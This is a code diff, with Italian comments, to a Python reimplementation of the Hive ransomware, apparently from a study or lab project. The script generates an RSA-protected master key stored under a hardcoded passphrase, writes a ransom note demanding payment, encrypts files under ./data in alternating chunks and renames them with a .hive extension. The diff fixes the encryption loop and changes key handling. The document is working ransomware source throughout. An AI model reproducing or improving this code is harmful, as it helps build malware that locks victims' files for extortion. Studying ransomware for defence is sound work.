@@ -3,8 +3,12 @@ import gc
 import Crypto
 from Crypto.Cipher import PKCS1_OAEP
 from Crypto.PublicKey import RSA
+from Crypto import Random
 import hashlib
 from base64 import urlsafe_b64encode, urlsafe_b64decode
+
+password = "hiveransomware"
+division_size = 200
 
 def base64UrlEncode(data):
     return urlsafe_b64encode(data).rstrip(b'=')
@@ -13,16 +17,29 @@ def base64UrlDecode(base64Url):
     padding = b'=' * (4 - (len(base64Url) % 4))
     return urlsafe_b64decode(base64Url + padding)
 
-def create_masterkey(cipher):
-    file_size = 10 * 1024 * 1024 # Dimensione 10 MiB
-    ciphertext = os.urandom(file_size) #int_key = int.from_bytes(os.urandom(file_size), byteorder='big') 
+def create_masterkey():
+    file_size = 10 * 1024 * 1024
+    message = os.urandom(file_size)
+    random_generator = Random.new().read
+    key = RSA.generate(2048, random_generator)
+    cipher = PKCS1_OAEP.new(key.publickey())
+    
+    message = [message[i:i+division_size] for i in range(0, len(message), division_size)]
+    ciphertext = bytearray()
+    for c in message:
+        ciphertext.extend(cipher.encrypt(c)) #non so come vengono incollati questi chunk nella ricerca?
+    with open("privatekey.pem", "wb") as f:
+        f.write(key.export_key('PEM',passphrase=password))
+        f.close()
+    # Dimensione 10 MiB
+    #int_key = int.from_bytes(os.urandom(file_size), byteorder='big') 
     #print(type(ciphertext))
     #ciphertext = cipher.encrypt(str(int_key))
 
-    print(hashlib.md5(ciphertext).digest())
-    print(bytes(base64UrlEncode(hashlib.md5(ciphertext).digest())))
+    #print(hashlib.md5(ciphertext).digest())
+    #print(bytes(base64UrlEncode(hashlib.md5(ciphertext).digest())))
 
-    mkey_name = bytes(base64UrlEncode(hashlib.md5(ciphertext).digest())).decode('utf-8') + '.key.hive' #baseurl64(MD5(encrypted_masterkey)).key.hive
+    mkey_name = bytes(base64UrlEncode(hashlib.md5(ciphertext).digest())).decode(errors='backslashreplace') + '.key.hive' #baseurl64(MD5(encrypted_masterkey)).key.hive
 
     with open(mkey_name, 'wb') as f:
         f.write(ciphertext)
@@ -30,8 +47,22 @@ def create_masterkey(cipher):
     return mkey_name
 
 def open_masterkey(key_name):
-    with open(key_name,'rb') as f:
-        return f.read()
+    with open("privatekey.pem",'rb') as f:
+        key = RSA.import_key(f.read(),passphrase=password)
+        f.close()
+    
+    decipher = PKCS1_OAEP.new(key)
+
+    with open(key_name,'rb') as ff:
+        file_contents = ff.read()
+        ff.close()
+    message = [file_contents[i:i+256] for i in range(0, len(file_contents), 256)]
+    ret_mess = bytearray()
+    for c in message:
+        ret_mess.extend(decipher.decrypt(c))
+    return ret_mess
+        #return decipher.decrypt(ff.read())
+    
 
 def create_ransomnote():
     note = "Il tuo sistema e' stato compromesso. Paga il riscatto o i tuoi dati saranno pubblicati sul nostro sito."
@@ -96,22 +127,23 @@ def chunk_encrypting(file, ks1, ks2, NBS):
     with open(file,'rb') as f:
         fileinbytes = bytearray(f.read())
 
-    my_size = file_stats.st_size
+    target_size = int(file_stats.st_size)
+    my_size = 0
     chunks = []
     flag_enc = True
     current = 0
     
-    while my_size >= 0:
+    while my_size < target_size:
         gc.collect()
         if (flag_enc):
             #print([True, current, current+0x1000])
             chunks.append([True, fileinbytes[int(current):int(current+0x1000)], int(current), int(current+0x1000)])
-            my_size -= int(0x1000)
+            my_size += int(0x1000)
             current += int(0x1000)
             flag_enc = not flag_enc
         else:
             chunks.append([False, fileinbytes[int(current):int(current+NBS)]])
-            my_size -= int(NBS)
+            my_size += int(NBS)
             current += int(NBS)
             flag_enc = not flag_enc
 
@@ -153,46 +185,9 @@ def list_files(dir):
     gc.collect()
     return file_paths
 
-#Fase 3: generazione keystream
-
-'''
-def str_bitwiseor(a,b):
-    if (len(a) > len(b)):
-        while(len(b) < len(a)):
-            b = '0' + b
-    else:
-        while(len(a) < len(b)):
-            a = '0' + a
-    s = ""
-    for i in range(0,len(a)):
-        #print(a[i]+" | "+b[i] +" = ",str(int(a[i]) | int(b[i])))
-        s = s + str(int(a[i])|int(b[i]))
-    return s
-
-def split_into_eight(string):
-    length = len(string)
-    num_blocks = length // 8
-    blocks = []
-    for i in range(num_blocks):
-        start = i * 8
-        end = start + 8
-        blocks.append(string[start:end])
-
-    if length % 8 > 0:
-        blocks.append(string[num_blocks*8:])
-
-    return blocks
-'''
-
 def hive_ransomware():
-    key_pair = RSA.generate(2048)
-
-    RSA_public_key = key_pair.publickey().exportKey()
-    RSA_private_key = key_pair.exportKey()
-    cipher = PKCS1_OAEP.new(RSA_public_key)
-
     #Fase 1: creazione della master key
-    key_name = create_masterkey(cipher)
+    key_name = create_masterkey()
     #Fase 2: creazione del messaggio di riscatto
     create_ransomnote()
     root = "./data"
@@ -217,15 +212,15 @@ def hive_ransomware():
 
         digest_bin = bytes(hashlib.md5(open_masterkey(key_name)).hexdigest(), encoding="utf-8")
 
-        new_name = file + "." + str(base64UrlEncode(digest_bin).decode('utf-8')) +"_"
+        new_name = file + "." + str(base64UrlEncode(digest_bin).decode('utf-8'))
         gc.collect()
-        new_name = new_name + str(base64UrlEncode(bytes(hex(R1)[2:],encoding="utf-8")).decode('utf-8')) +"_"
+        new_name = new_name + str(base64UrlEncode(bytes(hex(R1)[2:],encoding="utf-8")).decode('utf-8'))
         gc.collect()
         new_name = new_name + str(base64UrlEncode(bytes(hex(R2)[2:],encoding="utf-8")).decode('utf-8')) +".hive"
         new_path = os.path.join("", new_name)
         print(new_path)
         os.rename(file_path, new_path)
-    cleanup(key_name)
+    #cleanup(key_name)
 
 def cleanup(key_name):
 
